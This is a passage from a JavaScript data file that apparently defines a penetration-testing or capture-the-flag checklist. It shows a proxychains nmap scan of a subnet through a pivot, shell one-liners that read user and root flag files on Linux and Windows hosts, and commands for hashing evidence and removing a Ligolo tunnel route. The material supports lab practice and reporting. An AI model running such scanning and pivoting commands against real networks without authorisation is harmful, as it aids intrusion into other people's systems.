          { label: "Scan through proxy", value: "proxychains4 -q nmap -sT -Pn -n -p 22,80,135,139,443,445,3389,5985 {{subnet}}" },
        ],
      },
    ],
  },
  {
    id: "proof",
    number: "10",
    title: "Proof & reporting",
    summary: "Capture the flag, identity, and network context together, then preserve command output and hashes.",
    items: [
      {
        id: "proof-linux",
        title: "Capture Linux proof context",
        detail: "Capture the proof value from its original location in an interactive shell. Keep the target IP, current identity, file path, and file contents visible together in the screenshot.",
        commands: [
          { label: "User-level proof block", value: "hostname; whoami; id; ip addr; find /home -name '{{userFlagName}}' -print -exec cat {} \\; 2>/dev/null" },
          { label: "Root proof block", value: "hostname; whoami; id; ip addr; flag_path=$(find /root -name '{{rootFlagName}}' -print -quit 2>/dev/null); echo \"$flag_path\"; test -n \"$flag_path\" && cat \"$flag_path\"" },
        ],
      },
      {
        id: "proof-windows",
        title: "Capture Windows proof context",
        detail: "Capture the proof value from its original location in an interactive shell. Keep ipconfig, whoami, the original file path, and file contents visible together in the screenshot.",
        commands: [
          { label: "User-level proof block", value: "hostname & whoami & ipconfig & dir C:\\Users\\%USERNAME%\\Desktop\\{{userFlagName}} & type C:\\Users\\%USERNAME%\\Desktop\\{{userFlagName}}" },
          { label: "Administrator proof block", value: "hostname & whoami & ipconfig & dir C:\\Users\\Administrator\\Desktop\\{{rootFlagName}} & type C:\\Users\\Administrator\\Desktop\\{{rootFlagName}}" },
        ],
      },
      {
        id: "proof-artifacts",
        title: "Hash and inventory evidence",
        commands: [
          { label: "Evidence hashes", value: "find {{workspaceRoot}}/{{targetName}} -type f -print0 | sort -z | xargs -0 sha256sum > {{workspaceRoot}}/{{targetName}}/notes/SHA256SUMS" },
          { label: "File inventory", value: "find {{workspaceRoot}}/{{targetName}} -type f -printf '%TY-%Tm-%Td %TH:%TM %s %p\n' | sort > {{workspaceRoot}}/{{targetName}}/notes/inventory.txt" },
        ],
      },
      {
        id: "proof-cleanup",
        title: "Record cleanup and reset points",
        detail: "List uploaded files, changed configuration, created accounts, services, scheduled tasks, routes, and tunnels.",
        commands: [
          { label: "Stop terminal log", value: "exit" },
          { label: "Remove Ligolo route", value: "sudo ip route del {{subnet}} dev ligolo; sudo ip link del ligolo" },
        ],
      },
    ],
  },
];

export const ALL_ITEMS = CHECKLIST.flatMap((phase) =>
  phase.items.map((item) => ({ ...item, phaseId: phase.id, phaseTitle: phase.title })),
);
